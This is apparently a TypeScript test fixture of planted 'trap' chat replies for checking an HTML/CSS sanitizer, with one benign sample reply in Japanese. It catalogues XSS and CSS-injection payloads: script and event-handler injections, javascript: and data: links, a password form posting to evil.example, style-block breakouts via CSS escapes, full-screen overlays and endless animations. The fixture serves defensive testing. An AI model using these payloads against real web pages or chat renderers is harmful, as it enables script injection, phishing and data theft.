// Planted rich replies for tests/ui/chat-reply-cleaning.spec.ts: each part tries to run (pushes to top.__pwned),
// load from evil.example, send something, cover the app or move for ever. The demo's trap replies (2026-11-28,
// both versions) plus the ways around the newly allowed parts (inputs, labels, links, CSS motion) and the CSS
// parser's corners. All fictional.

const PWN = (what: string) => `(top.__pwned = top.__pwned || []).push('${what}')`
/** Every character that could end a CSS name written as an escape (`<` → `\3c `): the parser undoes them. */
const ESCAPED = (text: string) => text.replace(/[^A-Za-z0-9_-]/g, c => `\\${c.codePointAt(0)!.toString(16)} `)

/** The first version's traps: what runs, loads or covers. */
export const TRAPS = `
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/link.css">
<link rel="preconnect" href="https://evil.example">
<style>
  @import url("https://evil.example/import.css");
  @font-face { font-family: Evil; src: url("https://evil.example/font.woff2"); }
  .bg { background-image: url("https://evil.example/bg.png"); font-family: Evil; }
  .esc { background: \\75 rl("https://evil.example/escaped.png"); }
  .cover { position: fixed; inset: 0; z-index: 2147483647; background: rgba(200, 0, 0, .85); color: #fff; font-size: 40px; }
  :host { position: fixed; inset: 0; }
  body { background: url("https://evil.example/body.png"); }
</style>
<h3>わなを仕込んだ返事</h3>
<script>${PWN('script')}</script>
<img src="https://evil.example/pixel.png" alt="外の画像">
<img src="x" onerror="${PWN('img onerror')}">
<img srcset="https://evil.example/srcset.png 1x" alt="srcset">
<iframe src="https://evil.example/frame"></iframe>
<form action="https://evil.example/steal"><input name="pw" placeholder="パスワードを入れてください"><button>送る</button></form>
<p><a href="javascript:${PWN('javascript link')}">javascript: のリンク</a></p>
<p class="bg">外のフォントと背景画像を使う段落</p>
<p class="esc">エスケープで隠した url() の段落</p>
<p style="background-image: image-set('https://evil.example/image-set.png' 1x)">image-set の段落</p>
<div class="cover">画面全体を覆う（class）</div>
<div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,200,.8)">画面全体を覆う（style）</div>
<video src="https://evil.example/v.mp4" autoplay></video>
<object data="https://evil.example/o.swf"></object>
<embed src="https://evil.example/e.swf">
<details open ontoggle="${PWN('details ontoggle')}"><summary>開閉できる欄</summary>中身</details>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 30" onload="${PWN('svg onload')}">
  <image href="https://evil.example/svg-image.png" width="10" height="10"/>
  <rect width="120" height="30" rx="6" fill="#ddd"/><text x="10" y="20" font-size="12">SVG の中のわな</text>
</svg>
<div tabindex="0" autofocus onfocus="${PWN('autofocus')}">autofocus</div>
`

/** The seamless version's additions, attacked: inputs, labels, links, animations, hover. */
export const SEAMLESS_TRAPS = `
<h4>足した許可へのわな</h4>
<style>
  @keyframes evil { from { background-image: url("https://evil.example/keyframes.png"); position: fixed; inset: 0; } to { opacity: 1; } }
  .anim { animation: evil 1s infinite; }
  .hovertrap:hover { background: url("https://evil.example/hover.png"); }
  .hovertrap:hover::after { content: url("https://evil.example/after.png"); }
  #trap-check:checked ~ .cov { position: fixed; inset: 0; background: rgba(200, 0, 0, .9); }
  .tipbad:hover::after { content: attr(data-x); position: fixed; inset: 0; background: url("https://evil.example/tip.png"); }
</style>
<input type="image" src="https://evil.example/input-image.png" alt="画像のボタン">
<input type="text" value="文字の欄" autofocus onfocus="${PWN('input autofocus')}">
<input type="submit" value="送る" formaction="https://evil.example/submit">
<input type="checkbox" id="trap-check" onchange="${PWN('checkbox onchange')}" formaction="https://evil.example/fa" style="background: url(https://evil.example/cb.png)">
<label for="trap-check" onclick="${PWN('label onclick')}" class="trapbox">チェックで画面を覆う</label>
<div class="cov">覆う</div>
<p class="anim">外の画像をつかう動き</p>
<p class="hovertrap">マウスを乗せると外の画像</p>
<p class="tipbad" data-x="x">マウスを乗せると画面を覆う説明</p>
<p><a href="https://evil.example/link" ping="https://evil.example/ping">外へのリンク</a></p>
<p><a href="data:text/html,<script>${PWN('data link')}</script>">data: のリンク</a></p>
`

/** Corners of the parsers: ways to spell what the lists refuse so that a simple reading misses it. */
export const CORNER_TRAPS = `
<style>
  .breakout { content: "\\3c /style><img src=x onerror=${PWN('style breakout')}>"; }
  [title="\\3c /style><img src=x onerror=alert(1)>"] { color: red; }
  .breakvar { --b: "\\3c /style>"; }
  .var { --u: \\75 rl(https://evil.example/var-escape.png); background-image: var(--u); }
  .var2 { --img: url(https://evil.example/var.png); background-image: var(--img); }
  .wk { background-image: -webkit-image-set(url(https://evil.example/wk.png) 1x); }
  .fade { background-image: cross-fade(url(https://evil.example/a.png), url(https://evil.example/b.png), 50%); }
  .local { background-image: url(#x); }
  @media screen { @import url(https://evil.example/media-import.css); .m { background: url(https://evil.example/media.png); } }
  @layer evil { .layer { background: url(https://evil.example/layer.png); } }
  @supports (display: grid) { .sup { position: fixed; inset: 0; } }
  :root { --x: 1; } html { position: fixed; } :is(body) .y { color: red; }
  .sticky { position: sticky; top: 0; }
  .vh { height: 100dvh; width: 100svw; }
  .loop1 { animation: grow 1s 1000000000; }
  .loop2 { animation-name: grow; animation-duration: 1s; animation-iteration-count: 11; }
  .slow { animation: grow 100000s; transition: color 99999s; }
  .nest { color: blue; & .inner { background: url(https://evil.example/nested.png); } }
  @keyframes "quoted" { to { opacity: 0 } }
  @font-feature-values Evil { @swash { fancy: 1; } }
  .typing { -webkit-user-modify: read-write; user-select: all; pointer-events: none; }
  @property --p { syntax: '<url>'; inherits: false; initial-value: url(https://evil.example/property.png); }
  @counter-style evil { system: cyclic; symbols: url(https://evil.example/counter.png); }
  @page { background: url(https://evil.example/page.png); }
  .unclosed { background: url(https://evil.example/unclosed.png
</style>
<p class="breakout var var2 wk fade local m layer sup sticky vh loop1 loop2 slow nest" title="</style><img src=x onerror=alert(1)>">角のわな</p>
<style>.early { content: "</style><script>${PWN('html breakout')}</script>"; }</style>
<p style="background: u\\72l(https://evil.example/inline-escape.png); color: red">エスケープの style</p>
<p style="--z: url(https://evil.example/inline-var.png); background-image: var(--z)">変数の style</p>
<a href=" JaVaScRiPt:${PWN('mixed case link')}">大文字小文字のリンク</a>
<a href="java&#x09;script:${PWN('tab link')}">タブを挟んだリンク</a>
<a href="vbscript:msgbox(1)">vbscript</a>
<a href="file:///etc/passwd">ファイルのリンク</a>
<a href="//evil.example/protocol-relative">スキームなしのリンク</a>
<input type="RADIO" name="ok" id="r1"><label for="r1">大文字の radio</label>
<input type="radio" name="a b" id="x&quot;y" form="steal"><label for="has space">変な名前</label>
<input type=" checkbox " checked><input>
<input type="hidden" name="secret" value="x"><input type="file"><input type="password"><input type="search">
<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='${PWN('data svg')}'/>" alt="svg の data">
<img src="data:image/png;base64,iVBORw0KGgo=" onload="${PWN('png onload')}" loading="lazy" srcset="https://evil.example/s.png 2x">
<marquee>流れ続ける文字</marquee>
<math><mi xlink:href="javascript:${PWN('math')}">x</mi></math>
<template><img src=x onerror="${PWN('template')}"></template>
<noscript><img src=x onerror="${PWN('noscript')}"></noscript>
<!-- <img src=x onerror="${PWN('comment')}"> -->
<xmp><img src=x onerror="${PWN('xmp')}"></xmp>
<noembed><img src=x onerror="${PWN('noembed')}"></noembed>
<svg><style>@import url(https://evil.example/svg-style.css);</style><foreignObject><img src=x onerror="${PWN('foreign')}"></foreignObject></svg>
<svg><a href="javascript:${PWN('svg link')}"><text y="10">押して</text></a></svg>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><style>@keyframes pulse { to { opacity: 0 } } @media screen { @keyframes p2 { to { opacity: 0 } } } rect { animation: pulse 1s infinite; transition: fill 1s }</style><rect width="20" height="20" style="animation: p2 1s infinite"/></svg>
<img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 9 9'%3E%3Cstyle%3E@keyframes s { to { opacity: 0 } } circle { animation: s 1s infinite }%3C/style%3E%3Ccircle r='4' cx='4' cy='4'/%3E%3C/svg%3E" alt="動く svg の data">
<select><option>選ぶ</option></select><textarea>書く</textarea><button formaction="https://evil.example/b">押す</button>
<dialog open>開いた窓</dialog><div popover="auto" id="pop">ポップオーバー</div>
<audio src="https://evil.example/a.mp3" autoplay></audio><picture><source srcset="https://evil.example/p.png"></picture>
<portal src="https://evil.example/portal"></portal><fencedframe></fencedframe>
<table background="https://evil.example/table.png"><tr><td background="https://evil.example/td.png" colspan="2x">表</td></tr></table>
<div class="typing" style="-webkit-user-modify: read-write; clip-path: inset(0); behavior: url(x.htc); -moz-binding: url(x.xml); filter: url(#f); cursor: url(https://evil.example/c.cur), auto; mask-image: url(https://evil.example/m.png); list-style-image: url(https://evil.example/l.png)">古い仕掛け</div>
<plaintext><img src=x onerror="${PWN('plaintext')}">
`

/** The independent review's ways around the first cut (2026-11-28): names that end the rule, chained motion, the root. */
export const REVIEW_TRAPS = `
<style>
  .n1 { --x${ESCAPED(`</style><img src=x onerror=${PWN('custom name breakout')}>`)}: 1 }
  .n2 { --x${ESCAPED('}.q{background-image:url(https://evil.example/rule.png)}.r')}: 1 }
  .n3 { --x${ESCAPED('}*{position:fixed;inset:0}.r')}: 1 }
  .chain { animation-name: k, k, k, k, k, k; animation-duration: 10s; animation-iteration-count: 10; animation-delay: 0s, 100s, 200s, 300s, 400s, 500s; }
  .late { transition: color 1s 1000s; animation: k 1s 99999s; }
  :scope { position: relative; background: red; } & { color: red; }
  .cq { width: 100cqw; height: 100cqh; }
  .quote { --s: "nothing closes this; }
</style>
<p class="n1 n2 n3 chain late cq quote" style="--a${ESCAPED(';background-image:url(https://evil.example/inline.png);--b')}: 1">名前のわな</p>
<p style="--q: '}; background-image: url(https://evil.example/q.png)">引用符のわな</p>
<a href="https://app.acb@evil.example/">人をあざむくリンク</a>
<a href="https://user:pw@evil.example/">パスワードつきのリンク</a>
`

/** A reply as the AI would write it: what must survive cleaning. */
export const GOOD_REPLY = `
<style>
  .acb-key { color: var(--color-text); border-left: 3px solid var(--color-primary); padding: 8px 12px; }
  .acb-tab { display: none; }
  #m1:checked ~ .acb-tab:nth-of-type(1) { display: block; }
  .acb-bar > span { display: block; height: 8px; animation: grow 0.6s ease-out 1; transition: width 0.3s; }
  @keyframes grow { from { width: 0 } }
  @media (prefers-color-scheme: dark) { .acb-key { color: #eee; } }
</style>
<h3>経費の精算</h3>
<div class="acb-key"><strong>要点</strong> 締め日は毎月 25 日です。</div>
<table class="acb-compare"><thead><tr><th>くらべること</th><th class="best">B社</th></tr></thead>
<tbody><tr><td colspan="1">月の費用</td><td class="best"><span class="acb-yes">○</span> 2.5万円</td></tr></tbody></table>
<ol class="acb-steps"><li><details open><summary>申請する</summary><p>右上から。</p></details></li></ol>
<div class="acb-tabs">
  <input type="radio" name="m" id="m1" checked><label for="m1">今月</label>
  <input type="radio" name="m" id="m2"><label for="m2">先月</label>
  <div class="acb-tab"><div class="acb-bar"><span style="width: 45%"></span></div></div>
</div>
<label><input type="checkbox" checked> 確かめた</label>
<p>くわしくは <a href="https://example.com/guide?q=1">案内のページ</a> を見てください。</p>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" alt="点">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 30" aria-label="売上の図"><rect width="120" height="30" fill="#e0f2fe"/><text x="10" y="20">売上</text></svg>
`

export const ALL_TRAPS = `${TRAPS}\n${SEAMLESS_TRAPS}\n${REVIEW_TRAPS}\n${CORNER_TRAPS}`
